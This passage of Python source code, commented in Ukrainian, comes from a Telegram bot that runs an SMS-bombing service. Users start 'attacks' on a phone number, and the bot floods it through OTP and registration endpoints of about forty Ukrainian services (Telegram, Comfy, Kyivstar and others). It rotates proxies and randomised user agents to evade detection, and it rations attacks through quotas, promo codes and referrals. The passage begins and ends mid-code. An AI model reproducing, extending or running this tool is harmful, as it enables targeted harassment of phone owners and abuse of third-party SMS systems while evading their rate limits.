        await message.answer("Недостатньо прав.")

@dp.message_handler(text='Надіслати повідомлення користувачам')
async def broadcast_prompt(message: Message):
    if message.from_user.id in ADMIN:
        await Dialog.spam.set()
        await message.answer('Введіть повідомлення для користувачів:')
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.spam, content_types=[types.ContentType.TEXT, types.ContentType.PHOTO, types.ContentType.VIDEO, types.ContentType.DOCUMENT])
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text if message.text else ""
    content_type = "text" if message.text else "unknown"

    if message.photo:
        content_type = "photo"
        photo_id = message.photo[-1].file_id
    elif message.video:
        content_type = "video"
        video_id = message.video.file_id
    elif message.document:
        content_type = "document"
        document_id = message.document.file_id

    async with db_pool.acquire() as conn:
        users = await conn.fetch('SELECT user_id FROM users')
    
    success_count = 0
    error_count = 0

    # Батчинг: відправляємо по 20 користувачів паралельно
    BATCH_SIZE = 20
    
    async def send_to_user(user_id: int):
        """Асинхронна функція для відправки одному користувачу"""
        nonlocal success_count, error_count
        try:
            if content_type == "text":
                await bot.send_message(user_id, text)
            elif content_type == "photo":
                await bot.send_photo(user_id, photo_id, caption=text)
            elif content_type == "video":
                await bot.send_video(user_id, video_id, caption=text)
            elif content_type == "document":
                await bot.send_document(user_id, document_id, caption=text)
            success_count += 1
        except BotBlocked:
            error_count += 1
        except UserDeactivated:
            error_count += 1
        except ChatNotFound:
            error_count += 1
        except Exception as e:
            logging.debug(f"Помилка при відправленні користувачу {user_id}: {e}")
            error_count += 1

    # Відправляємо батчами паралельно
    for i in range(0, len(users), BATCH_SIZE):
        batch = users[i:i + BATCH_SIZE]
        tasks = [send_to_user(user['user_id']) for user in batch]
        await asyncio.gather(*tasks, return_exceptions=True)
        # Невелика пауза між батчами, щоб не перевантажити API
        if i + BATCH_SIZE < len(users):
            await asyncio.sleep(0.1)

    await message.answer(f'Повідомлення відправлено!\nУспішно: {success_count}\nПомилок: {error_count}')
    await state.finish()

@dp.message_handler(text="Додати номер до чорного списку")
async def add_to_blacklist_start(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🔴 <b>Додавання номера до чорного списку</b>\n\nВведіть номер телефону:\nПриклад: <i>🇺🇦380xxxxxxxxx</i>\n\n💡 Ви можете написати <b>Скасувати</b> для відміни операції.", parse_mode="html")
        await Dialog.add_to_blacklist.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.add_to_blacklist)
async def add_to_blacklist_process(message: Message, state: FSMContext):
    phone = message.text.strip()
    
    # Перевіряємо на скасування
    if phone.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    # Видаляємо всі символи окрім цифр
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'):
        phone = '380' + phone[1:]

    if not re.match(r"^\d{12}$", phone):
        await message.answer("❌ Невірний формат номера.\n\nВведіть номер повторно або напишіть <b>Скасувати</b> для відміни.\nПриклад: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"✅ Номер {phone} додано до чорного списку.", parse_mode="html", reply_markup=profile_keyboard)
    except Exception as e:
        await message.answer("❌ Сталася помилка при додаванні номера до чорного списку.", parse_mode="html", reply_markup=profile_keyboard)
        logging.error(f"Помилка при додаванні в чорний список: {e}")
    
    await state.finish()

@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    args = message.get_args()
    
    if not args:
        await message.answer("Будь ласка, введіть номер телефону для додавання до чорного списку.\nПриклад: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("Номер повинен бути формату: 380ХХХХХХХХХ. Будь ласка, введіть номер повторно.")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"Номер {phone} додано до чорного списку.")
    except Exception as e:
        await message.answer("Сталася помилка при додаванні номера до чорного списку.")
        print(f"Помилка: {e}")

@dp.message_handler(commands=['nonstart'])
async def nonstart(message: Message):
    empty_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    await message.answer("Я ж сказав не натискати...", reply_markup=empty_keyboard)


@dp.message_handler(text="Заблокувати користувача")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🔴 <b>Блокування користувача</b>\n\nВведіть ID користувача для блокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.block_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} заблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="Розблокувати користувача")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🟢 <b>Розблокування користувача</b>\n\nВведіть ID користувача для розблокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.unblock_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} розблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="Реферали")
async def show_referrals(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            referrals = await conn.fetch('''
                SELECT user_id, name, username, referral_count 
                FROM users 
                WHERE referral_count > 0 
                ORDER BY referral_count DESC
            ''')
        
        if not referrals:
            await message.answer("Поки що немає користувачів з рефералами.")
            return
        
        message_text = "👥 <b>Користувачі з рефералами:</b>\n\n"
        
        for ref in referrals:
            user_id = ref['user_id']
            name = ref['name'] or "Без імені"
            username = ref['username'] or "Без username"
            count = ref['referral_count']
            
            message_text += f"• <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
            message_text += f"  └ Кількість рефералів: {count}\n\n"
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(text="Назад")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('Ви повернулись до головного меню.', reply_markup=profile_keyboard)
    else:
        await message.answer('Ви не є адміном.')

@dp.message_handler(text='🆘 Допомога')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "Виникли питання? Звертайся до @Nobysss", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)



@dp.message_handler(text='🎪 Запросити друга')
async def referral_program(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        referral_data = await conn.fetchrow(
            'SELECT referral_count, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1',
            user_id
        )
        
        referral_count = referral_data['referral_count'] if referral_data else 0
        referral_attacks = referral_data['referral_attacks'] if referral_data else 0
        unused_referral_attacks = referral_data['unused_referral_attacks'] if referral_data else 0
        
        referral_total = referral_attacks + unused_referral_attacks
        
        bot_username = (await bot.me).username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        referrals = await conn.fetch(
            'SELECT u.user_id, u.name, u.username, r.join_date FROM referrals r JOIN users u ON r.referred_id = u.user_id WHERE r.referrer_id = $1 ORDER BY r.join_date DESC',
            user_id
        )
    
    message_text = f"🎪 <b>Запросити друга</b>\n\n"
    message_text += f"🔗 Ваше посилання для друга:\n<code>{referral_link}</code>\n\n"
    message_text += "💡 <b>Як це працює?</b>\n"
    message_text += "• 🎯 Поділися посиланням з другом\n"
    message_text += "• 🎉 Коли друг підпишеться на канал — він стане частиною нашої спільноти\n"
    message_text += "• 🚀 Завдяки тобі ми зможемо зростати та робити для тебе ще більше\n\n"
    
    if referrals:
        message_text += f"📊 <b>Статистика:</b>\n"
        message_text += f"├ Всього рефералів: {referral_count}\n"
        message_text += f"├ Доступно атак от рефералов: {referral_total}\n"
        if unused_referral_attacks > 0:
            message_text += f"└ Накопичено атак: {unused_referral_attacks}\n"
        message_text += f"\n<b>Ваші реферали:</b>\n"
        for ref in referrals:
            ref_name = ref['username'] or ref['name'] or f"User{ref['user_id']}"
            message_text += f"• <a href='tg://user?id={ref['user_id']}'>{ref_name}</a> - {ref['join_date'].strftime('%d.%m.%Y')}\n"
    
    keyboard = InlineKeyboardMarkup()
    share_text = "Привіт! Приєднуйся до нашого боту! 📱 Завдяки тобі ми зможемо зростати та робити для тебе ще більше 🚀"
    encoded_text = urllib.parse.quote(share_text)
    share_url = f"https://t.me/share/url?url={referral_link}&text={encoded_text}"
    keyboard.add(InlineKeyboardButton("🎯 Поділитися посиланням", url=share_url))
    
    await message.answer(message_text, parse_mode='HTML', reply_markup=keyboard)

@dp.message_handler(text='❓ Перевірити атаки')
@dp.throttled(anti_flood, rate=3)
async def check_attacks(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    # Отримуємо актуальну інформацію про атаки
    can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    message_text = "📊 <b>Ваші атаки:</b>\n\n"
    message_text += f"⚔️ Звичайні атаки: {attacks_left}\n"
    if promo_attacks > 0:
        message_text += f"🎁 Промо атаки: {promo_attacks}\n"
    if referral_attacks > 0:
        message_text += f"🎪 Реферальні атаки: {referral_attacks}\n"
    message_text += f"\n💥 <b>Всього доступно: {total_attacks}</b>\n\n"
    
    if total_attacks > 0:
        message_text += "✅ Ви можете розпочати атаку!"
    else:
        message_text += "❌ На сьогодні ліміт атак вичерпано. Чекаємо на вас завтра або ви можете скористуватись промокодом чи рефералом."
    
    await message.answer(message_text, parse_mode='HTML')

@dp.message_handler(text='🎯 Почати атаку')
async def start_attack_prompt(message: Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    message_text = '🎯 Готовий до атаки!\n\n💥 Очікую на номер телефону..'
    
    await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number, chat_id, proxy_counter=None, shuffled_proxies_list=None):
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    
    # Перевикористовуємо HTTP session
    session = await get_http_session()
    
    # Лічильник для round-robin розподілу проксі (якщо не передано, створюємо новий)
    if proxy_counter is None:
        _proxy_counter = {'value': 0}
    else:
        _proxy_counter = proxy_counter
    
    # Використовуємо переданий список перемішаних проксі або створюємо новий
    import random
    if shuffled_proxies_list is not None and len(shuffled_proxies_list) > 0:
        # Використовуємо існуючий перемішаний список (для продовження між етапами)
        shuffled_proxies = shuffled_proxies_list
        logging.debug(f"[ATTACK] Використовуємо {len(shuffled_proxies)} проксі з попереднього етапу (поточний індекс: {_proxy_counter['value']})")
    else:
        # Отримуємо нові проксі та перемішуємо (тільки для першого етапу)
        proxies = []
        if USE_PROXIES:
            try:
                proxies = await get_available_proxies(min_success_rate=0, use_cache=True)
                logging.debug(f"[ATTACK] Proxies for attack: {len(proxies)} available")
            except Exception as e:
                logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
                proxies = []
        
        shuffled_proxies = proxies.copy()
        random.shuffle(shuffled_proxies)
        logging.debug(f"[ATTACK] Створено новий перемішаний список з {len(shuffled_proxies)} проксі")
    
    def pick_proxy():
        """Повертає проксі через round-robin для рівномірного розподілу"""
        if not shuffled_proxies or not USE_PROXIES:
            return None, None
        try:
            # Round-robin: використовуємо modulo для циклічного обходу
            idx = _proxy_counter['value'] % len(shuffled_proxies)
            _proxy_counter['value'] += 1
            selected = shuffled_proxies[idx]
            
            normalized = normalize_proxy_string(selected)
            url, auth = parse_proxy_for_aiohttp(normalized)
            logging.debug(f"[PROXY] Pick proxy[{idx}/{len(shuffled_proxies)}] => {mask_proxy_for_log(normalized)}")
            return url, auth
        except Exception as e:
            logging.error(f"[ATTACK] Помилка парсингу проксі: {e}")
            return None, None

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"Не вдалося отримати CSRF-токен: {e}")
        return

    logging.info(f"Отримано CSRF-токен: {csrf_token}")

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"

    logging.info(f"Запуск атаки на номер {number}")

    async def send_request_with_retry(url, **kwargs):
        """Відправка з retry та новим проксі при fail"""
        MAX_RETRIES = 2
        method = kwargs.pop('method', 'POST')
        original_proxy = kwargs.get('proxy')
        original_auth = kwargs.get('proxy_auth')
        req_cookies = kwargs.pop('cookies', None)
        
        # Використовуємо окрему сесію якщо є cookies, інакше перевикористовуємо глобальну
        use_custom_session = req_cookies is not None
        
        for attempt in range(MAX_RETRIES + 1):
            try:
                if not attack_flags.get(chat_id):
                    return
                
                # При retry пробуємо новий проксі (якщо є)
                if attempt > 0 and shuffled_proxies and USE_PROXIES:
                    try:
                        # Беремо наступний проксі для retry
                        retry_idx = (_proxy_counter['value'] + attempt - 1) % len(shuffled_proxies)
                        retry_proxy = shuffled_proxies[retry_idx]
                        normalized = normalize_proxy_string(retry_proxy)
                        new_proxy, new_auth = parse_proxy_for_aiohttp(normalized)
                        if new_proxy:
                            kwargs['proxy'] = new_proxy
                            kwargs['proxy_auth'] = new_auth
                            logging.debug(f"[ATTACK] Retry {attempt} for {url} with new proxy")
                        else:
                            kwargs['proxy'] = original_proxy
                            kwargs['proxy_auth'] = original_auth
                    except Exception:
                        kwargs['proxy'] = original_proxy
                        kwargs['proxy_auth'] = original_auth
                
                if use_custom_session:
                    async with aiohttp.ClientSession(cookies=req_cookies) as custom_session:
                        if method == 'GET':
                            async with custom_session.get(url, **kwargs) as response:
                                if response.status == 200:
                                    logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                    return True
                        else:
                            async with custom_session.post(url, **kwargs) as response:
                                if response.status == 200:
                                    logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                    return True
                else:
                    if method == 'GET':
                        async with session.get(url, **kwargs) as response:
                            if response.status == 200:
                                logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                return True
                    else:
                        async with session.post(url, **kwargs) as response:
                            if response.status == 200:
                                logging.debug(f"[ATTACK] Success - {number} -> {url}")
                                return True
                return False
            except asyncio.TimeoutError:
                if attempt < MAX_RETRIES:
                    logging.debug(f"[ATTACK] Timeout retry {attempt+1} for {url}")
                    await asyncio.sleep(0.2 * (attempt + 1))
                    continue
                logging.debug(f"[ATTACK] Timeout after {MAX_RETRIES+1} attempts: {url}")
                # Update circuit breaker для проксі
                if original_proxy and USE_PROXIES:
                    now = asyncio.get_event_loop().time()
                    if original_proxy in _proxy_circuit_breaker:
                        _proxy_circuit_breaker[original_proxy] = (_proxy_circuit_breaker[original_proxy][0] + 1, now)
                    else:
                        _proxy_circuit_breaker[original_proxy] = (1, now)
                return False
            except aiohttp.ClientError as e:
                if attempt < MAX_RETRIES:
                    logging.debug(f"[ATTACK] ClientError retry {attempt+1} for {url}: {e}")
                    await asyncio.sleep(0.2 * (attempt + 1))
                    continue
                logging.debug(f"[ATTACK] ClientError after {MAX_RETRIES+1} attempts: {url} - {e}")
                return False
            except Exception as e:
                logging.debug(f"[ATTACK] Exception for {url}: {e}")
                return False
        
        return False

    # Збільшуємо паралелізм для кращої продуктивності
    semaphore = asyncio.Semaphore(12)
    
    async def bounded_request(url, **kwargs):
        if not attack_flags.get(chat_id):
            return
        async with semaphore:
            await send_request_with_retry(url, **kwargs)

    # Рандомізація та каскад: перемішуємо сервіси та додаємо паузи
    import random
    # Створюємо список запитів з унікальними проксі для кожного
    services = [
        ("https://my.telegram.org/auth/send_password", {"data": {"phone": "+" + number}}, 'POST'),
        ("https://helsi.me/api/healthy/v2/accounts/login", {"json": {"phone": number, "platform": "PISWeb"}}, 'POST'),
        ("https://auth.multiplex.ua/login", {"json": {"login": "+" + number}}, 'POST'),
        ("https://api.pizzaday.ua/api/V1/user/sendCode", {"json": {"applicationSend": "sms", "lang": "uk", "phone": number}}, 'POST'),
        ("https://stationpizza.com.ua/api/v1/auth/phone-auth", {"json": {"needSubscribeForNews": "false", "phone": formatted_number}}, 'POST'),
        ("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", {"json": {"phone": "+" + number}}, 'POST'),
        ("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", {"json": {"phone": formatted_number, "type": ""}}, 'POST'),
        ("https://pizza-time.eatery.club/site/v1/pre-login", {"json": {"phone": number}}, 'POST'),
        ("https://iq-pizza.eatery.club/site/v1/pre-login", {"json": {"phone": number}}, 'POST'),
        ("https://dnipro-m.ua/ru/phone-verification/", {"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro}, 'POST'),
        ("https://my.ctrs.com.ua/api/v2/signup", {"json": {"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, "headers": headers_citrus, "cookies": cookies_citrus}, 'POST'),
        ("https://my.ctrs.com.ua/api/auth/login", {"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus}, 'POST'),
        ("https://auth.easypay.ua/api/check", {"json": {"phone": number}, "headers": headers_easypay}, 'POST'),
        ("https://sandalini.ua/ru/signup/", {"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}}, 'POST'),
        ("https://uvape.pro/index.php?route=account/register/add", {"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape}, 'POST'),
        ("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4}}, 'POST'),
        ("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4, "only_sms": "1"}}, 'POST'),
        ("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", {"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape}, 'POST'),
        ("https://im.comfy.ua/api/auth/v3/otp/send", {"json": {"phone": number}}, 'POST'),
        ("https://im.comfy.ua/api/auth/v3/ivr/send", {"json": {"phone": number}}, 'POST'),
        ("https://www.moyo.ua/identity/registration", {"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo}, 'POST'),
        ("https://pizza.od.ua/ajax/reg.php", {"data": {"phone": formatted_number4}}, 'POST'),
        ("https://sushiya.ua/ru/api/v1/user/auth", {"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya}, 'POST'),
        ("https://avrora.ua/index.php?dispatch=otp.send", {"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}}, 'POST'),
        ("https://zolotakraina.ua/ua/turbosms/verification/code", {"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota}, 'POST'),
        ("https://auto.ria.com/iframe-ria-login/registration/2/4", {"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria}, 'POST'),
        (f"https://ukrpas.ua/login?phone=+{number}", {}, 'GET'),
        ("https://maslotom.com/api/index.php?route=api/account/phoneLogin", {"data": {"phone": formatted_number6}}, 'POST'),
        ("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", {"json": {"phone": "+" + number}}, 'POST'),
        ("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", {"data": {"telephone": formatted_number7}}, 'POST'),
        ("https://api.iqos.com.ua/v1/auth/otp", {"json": {"phone": number}}, 'POST'),
        (f"https://llty-api.lvivkholod.com/api/client/{number}", {}, 'POST'),
        ("https://api-mobile.planetakino.ua/graphql", {"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}}, 'POST'),
        ("https://back.trofim.com.ua/api/via-phone-number", {"json": {"phone": number}}, 'POST'),
        ("https://dracula.robota.ua/?q=SendOtpCode", {"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}}, 'POST'),
        (f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", {}, 'GET'),
        ("https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir}, 'POST'),
        ("https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call}, 'POST'),
        (f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", {}, 'GET'),
        ("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", {"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}}, 'POST')
    ]
    
    # Створюємо tasks з унікальними проксі та User-Agent для кожного запиту
    tasks = []
    for url, kwargs, method in services:
        proxy_url, proxy_auth = pick_proxy()  # Кожен запит отримує унікальний проксі
        req_kwargs = kwargs.copy()
        
        # Генеруємо унікальний User-Agent для кожного запиту
        unique_ua = fake_useragent.UserAgent().random
        
        # Додаємо headers якщо не вказані
        if "headers" not in req_kwargs:
            req_kwargs["headers"] = {"User-Agent": unique_ua}
        else:
            # Оновлюємо User-Agent навіть якщо headers вже є
            if isinstance(req_kwargs["headers"], dict):
                req_kwargs["headers"] = req_kwargs["headers"].copy()
                req_kwargs["headers"]["User-Agent"] = unique_ua
            else:
                # Якщо headers - це вже об'єкт, створюємо новий словник
                req_kwargs["headers"] = {"User-Agent": unique_ua}
        
        # Додаємо метод, проксі та авторизацію
        req_kwargs["method"] = method
        req_kwargs["proxy"] = proxy_url
        req_kwargs["proxy_auth"] = proxy_auth
        tasks.append(bounded_request(url, **req_kwargs))

    if not attack_flags.get(chat_id):
        return
    
    # Рандомізуємо порядок сервісів для меншого патерну
    random.shuffle(tasks)
    
    # Виконуємо паралельно (gather) для кращої продуктивності
    # з каскадною логікою: спочатку швидкі, потім повільніші
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    except Exception as e:
        logging.debug(f"[ATTACK] Gather exception (non-critical): {e}")

async def start_attack(number, chat_id, status_message_id: int = None):
    global attack_flags
    attack_flags[chat_id] = True
    
    timeout = 120  # 2 хвилини
    start_time = asyncio.get_event_loop().time()
    MAX_STAGES = 3  # Максимум 3 етапи
    PAUSE_MIN = 10  # Мінімальна пауза між етапами (секунди)
    PAUSE_MAX = 20  # Максимальна пауза між етапами (секунди)
    
    # Отримуємо список проксі один раз для всіх етапів
    global_proxy_counter = {'value': 0}
    global_shuffled_proxies = []
    
    if USE_PROXIES:
        try:
            proxies = await get_available_proxies(min_success_rate=0, use_cache=False)
            import random
            global_shuffled_proxies = proxies.copy()
            random.shuffle(global_shuffled_proxies)
            logging.info(f"[ATTACK] Ініціалізовано {len(global_shuffled_proxies)} проксі для всіх {MAX_STAGES} етапів")
        except Exception as e:
            logging.error(f"[ATTACK] Помилка отримання проксі: {e}")
            global_shuffled_proxies = []

    async def update_status(text: str):
        """Оновлює статус повідомлення замість створення нового"""
        if status_message_id:
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_message_id,
                    text=text,
                    parse_mode="HTML",
                    reply_markup=get_cancel_keyboard()
                )
            except Exception as e:
                # Якщо не вдалося оновити (наприклад, повідомлення не змінилося), створюємо нове
                logging.debug(f"Could not edit message, sending new: {e}")
                asyncio.create_task(bot.send_message(chat_id, text, parse_mode="HTML"))
        else:
            asyncio.create_task(bot.send_message(chat_id, text, parse_mode="HTML"))

    try:
        # Перед атакою: перевіряємо проксі та оновлюємо метрики
        try:
            await ensure_recent_proxy_check()
        except Exception as e:
            logging.error(f"Помилка перевірки проксі (продовжуємо без неї): {e}")
        
        stage_num = 0
        while (asyncio.get_event_loop().time() - start_time) < timeout and stage_num < MAX_STAGES:
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                await update_status(f'🛑 Атака на номер <i>{number}</i> зупинена користувачем.')
                return
            
            stage_num += 1
            logging.info(f"[ATTACK] Етап {stage_num}/{MAX_STAGES} для {number}")
            await update_status(f'🎯 Місія в процесі\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Етап: {stage_num}/{MAX_STAGES}')
            
            try:
